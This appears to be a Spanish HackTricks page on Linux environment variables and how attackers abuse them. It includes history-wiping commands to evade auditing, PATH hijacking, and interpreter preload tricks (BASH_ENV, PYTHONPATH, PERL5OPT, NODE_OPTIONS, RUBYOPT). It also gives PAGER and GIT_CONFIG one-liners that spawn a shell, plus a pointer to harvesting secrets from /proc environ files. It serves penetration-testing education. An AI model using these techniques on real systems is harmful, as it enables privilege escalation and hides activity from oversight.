# Variables de entorno de Linux

{{#include ../../banners/hacktricks-training.md}}

## Variables globales

Las variables globales **serán** heredadas por los **procesos secundarios**.

Puedes crear una variable global para tu sesión actual haciendo:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Esta variable estará disponible para tus sesiones actuales y sus procesos secundarios.

Puedes **eliminar** una variable haciendo:
```bash
unset MYGLOBAL
```
## Variables locales

Las **variables locales** solo pueden ser **accedidas** por el **shell/script actual**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Listar variables actuales
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
El contenido de `/proc/*/environ` está separado mediante **NUL**, por lo que estas variantes suelen ser más fáciles de leer:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Si buscas **credenciales** o **configuración interesante de servicios** dentro de entornos heredados, consulta también [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Variables comunes

De: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – la pantalla utilizada por **X**. Esta variable normalmente se establece en **:0.0**, lo que significa la primera pantalla del equipo actual.
- **EDITOR** – el editor de texto preferido del usuario.
- **HISTFILESIZE** – el número máximo de líneas contenidas en el archivo de historial.
- **HISTSIZE** – número de líneas añadidas al archivo de historial cuando el usuario finaliza su sesión.
- **HOME** – tu directorio personal.
- **HOSTNAME** – el nombre de host del equipo.
- **LANG** – tu idioma actual.
- **MAIL** – la ubicación del buzón de correo del usuario. Normalmente **/var/spool/mail/USER**.
- **MANPATH** – la lista de directorios donde buscar páginas del manual.
- **OSTYPE** – el tipo de sistema operativo.
- **PS1** – el prompt predeterminado en bash.
- **PATH** – almacena la ruta de todos los directorios que contienen archivos binarios que quieres ejecutar especificando únicamente el nombre del archivo, en lugar de una ruta relativa o absoluta.
- **PWD** – el directorio de trabajo actual.
- **SHELL** – la ruta al shell de comandos actual (por ejemplo, **/bin/bash**).
- **TERM** – el tipo de terminal actual (por ejemplo, **xterm**).
- **TZ** – tu zona horaria.
- **USER** – tu nombre de usuario actual.

## Variables interesantes para hacking

No todas las variables son igual de útiles. Desde una perspectiva ofensiva, prioriza las variables que cambian **rutas de búsqueda**, **archivos de inicio**, **comportamiento del enlazador dinámico** o **auditoría/registro**.

### **HISTFILESIZE**

Cambia el **valor de esta variable a 0**, de modo que cuando **finalices tu sesión**, el **archivo de historial** (\~/.bash_history) se **trunque a 0 líneas**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Cambia el **valor de esta variable a 0**, para que los comandos **no se conserven en el historial en memoria** ni se escriban de nuevo en el **archivo de historial** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Si el **valor de esta variable se establece en `ignorespace` o `ignoreboth`**, cualquier comando precedido por un espacio adicional no se guardará en el historial.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Apunta el **archivo de historial** a **`/dev/null`** o desactívalo por completo. Esto suele ser más fiable que cambiar únicamente el tamaño del historial.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy y https_proxy

Los procesos usarán el **proxy** declarado aquí para conectarse a Internet mediante **http o https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: proxy predeterminado para herramientas/protocolos que lo admitan.
- `no_proxy`: lista de exclusión (hosts/dominios/CIDR) que deben conectarse directamente.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Se pueden usar las variantes en minúsculas y mayúsculas según la herramienta (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Los procesos confiarán en los certificados indicados en **estas variables de entorno**. Esto resulta útil para hacer que herramientas como **`curl`**, **`git`**, clientes HTTP de Python o gestores de paquetes confíen en una CA controlada por el atacante (por ejemplo, para hacer que un proxy de interception parezca legítimo).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Si un wrapper/script privilegiado ejecuta comandos **sin rutas absolutas**, el **primer directorio controlado por el atacante** en `PATH` gana. Este es el primitivo detrás de muchos **PATH hijacks** en `sudo`, trabajos de cron, shell wrappers y helpers SUID personalizados. Busca `env_keep+=PATH`, un `secure_path` débil o wrappers que llamen a `tar`, `service`, `cp`, `python`, etc. por nombre.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
For full privilege-escalation chains abusing `PATH`, check [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` no es solo una referencia de directorio: muchas herramientas cargan automáticamente **dotfiles**, **plugins** y **configuración por usuario** desde `$HOME` o `$XDG_CONFIG_HOME`. Si un flujo de trabajo privilegiado conserva estos valores, la **config injection** puede ser más sencilla que el binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Los objetivos interesantes incluyen `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` y archivos específicos de herramientas como `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Estas variables influyen en el **dynamic linker**:

- `LD_PRELOAD`: fuerza la carga anticipada de objetos compartidos adicionales.
- `LD_LIBRARY_PATH`: antepone directorios de búsqueda de bibliotecas.
- `LD_AUDIT`: carga bibliotecas auditoras que observan la carga de bibliotecas y la resolución de símbolos.

Son extremadamente valiosas para **hooking**, **instrumentation** y **privilege escalation** si un comando privilegiado las conserva. En el modo de **secure-execution** (`AT_SECURE`, por ejemplo, setuid/setgid/capabilities), el loader elimina o restringe muchas de estas variables. Sin embargo, los errores del parser en esa fase inicial del loader siguen teniendo un gran impacto porque se ejecutan **antes** que el programa objetivo.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` cambia el comportamiento inicial de glibc (por ejemplo, los tunables del allocator) y resulta muy útil en laboratorios de exploit. También es importante desde una perspectiva de seguridad porque el **cargador dinámico lo analiza muy pronto**. El bug **Looney Tunables** de 2023 fue un buen recordatorio de que una sola variable de entorno analizada por el cargador puede convertirse en una **primitiva de escalada local de privilegios** contra programas SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Si **Bash** se inicia de forma **no interactiva**, comprueba `BASH_ENV` y obtiene ese archivo antes de ejecutar el script objetivo. Cuando Bash se invoca como `sh`, o en modo interactivo de estilo POSIX, también puede consultar `ENV`. Esta es una forma clásica de convertir un wrapper de shell en ejecución de código si el entorno está controlado por el atacante.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignora estos archivos de inicio cuando los **IDs real/efectivo difieren**; `-p` conserva el ID efectivo, pero no habilita esos archivos de inicio, por lo que el comportamiento exacto depende de cómo el wrapper invoque el shell. Ten cuidado con los wrappers privilegiados que llaman a `setuid()`/`setgid()` **antes** de iniciar Bash: una vez que los IDs vuelven a coincidir, Bash puede confiar en `BASH_ENV`, `ENV` y el estado relacionado del shell que de otro modo ignoraría.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Estas variables cambian cómo se inicia Python:

- `PYTHONPATH`: antepone rutas de búsqueda de imports.
- `PYTHONHOME`: reubica el árbol de la librería estándar.
- `PYTHONSTARTUP`: ejecuta un archivo antes del prompt interactivo.
- `PYTHONINSPECT=1`: entra en modo interactivo después de que finaliza un script.

Son útiles contra scripts de mantenimiento, debuggers, shells y wrappers que llaman a Python con un entorno controlable. `python -E` y `python -I` ignoran todas las variables `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Un ejemplo real reciente fue el LPE de **needrestart** de 2024 en sistemas Ubuntu/Debian: el scanner propiedad de root copiaba el `PYTHONPATH` de un proceso sin privilegios desde `/proc/<PID>/environ` y luego ejecutaba Python. El exploit publicado colocaba `importlib/__init__.so` en la ruta controlada por el atacante para que Python ejecutara el código del atacante durante su propia inicialización, antes de que el script codificado de forma fija del helper siquiera importara.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl tiene variables de inicio igualmente útiles:

- `PERL5LIB`: antepone directorios de bibliotecas.
- `PERL5OPT`: inyecta switches como si estuvieran en cada línea de comandos de `perl`.

Esto puede forzar la **carga automática de módulos** o cambiar el comportamiento del intérprete antes de que el script objetivo haga algo interesante. Perl ignora estas variables en contextos de **taint / setuid / setgid**, pero siguen siendo muy relevantes para wrappers normales ejecutados como root, trabajos de CI, instaladores y reglas personalizadas de sudoers.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` antepone **opciones CLI de Node.js** a cada proceso `node` que herede el entorno. Esto lo hace útil contra wrappers, trabajos de CI, helpers de Electron y reglas de sudo que finalmente ejecutan Node. Las opciones más interesantes desde el punto de vista ofensivo suelen ser:

- `--require <file>`: precarga un archivo CommonJS antes del script objetivo.
- `--import <module>`: precarga un módulo ES antes del script objetivo.

Node rechaza algunas opciones peligrosas en `NODE_OPTIONS`, pero `--require` y `--import` están permitidas explícitamente y se procesan **antes** de los argumentos normales de la línea de comandos.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Para cadenas de gadgets remotas que establecen `NODE_OPTIONS` indirectamente (por ejemplo, prototype-pollution to RCE), consulta [esta otra página](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby ofrece la misma clase de abuso durante el arranque:

- `RUBYLIB`: antepone directorios a la ruta de carga de Ruby.
- `RUBYOPT`: inyecta opciones de línea de comandos como `-r` en cada invocación de `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Las vulnerabilidades de **needrestart** de 2024 demostraron que esto no es solo un truco de laboratorio: el mismo helper propiedad de root que era vulnerable al abuso de `PYTHONPATH` también podía ser obligado a ejecutar Ruby con un `RUBYLIB` controlado por el atacante, cargando `enc/encdb.so` desde un directorio del atacante.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR y LESSOPEN**

Algunas herramientas no solo leen una ruta desde el entorno; pasan el valor a un **shell**, un **editor** o un **preprocesador de entrada**. Esto hace que las siguientes variables sean especialmente interesantes cuando un wrapper privilegiado ejecuta `git`, `man`, `less` o visores de texto similares:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: eligen el comando del paginador.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: eligen el comando del editor, normalmente con argumentos.
- `LESSOPEN`, `LESSCLOSE`: definen preprocesadores y postprocesadores que se ejecutan cuando `less` abre un archivo.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git también admite la **inyección de configuración solo mediante variables de entorno** sin tocar el disco mediante `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` y `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Desde una perspectiva de post-exploitation, recuerda también que los entornos heredados suelen contener **credentials**, **proxy settings**, **service tokens** o **cloud keys**. Consulta [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) para buscar en `/proc/<PID>/environ` y en `systemd` mediante `Environment=`.

### PS1

Cambia el aspecto de tu prompt.

[**Este es un ejemplo**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Este es un ejemplo](<../images/image (897).png>)

Usuario normal:

![PERL5OPT & PERL5LIB - PS1: Uno, dos y tres jobs ejecutándose en segundo plano](<../images/image (740).png>)

Uno, dos y tres jobs ejecutándose en segundo plano:

![PERL5OPT & PERL5LIB - PS1: Uno, dos y tres jobs ejecutándose en segundo plano](<../images/image (145).png>)

Un job en segundo plano, uno detenido y el último comando no terminó correctamente:

![PERL5OPT & PERL5LIB - PS1: Un job en segundo plano, uno detenido y el último comando no terminó correctamente](<../images/image (715).png>)

## References

- [1] [Manual de GNU Bash - Archivos de inicio de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs en needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentación de la CLI de Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variables de entorno comunes - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Escalada de privilegios local en el ld.so de glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
{{#include ../../banners/hacktricks-training.md}}
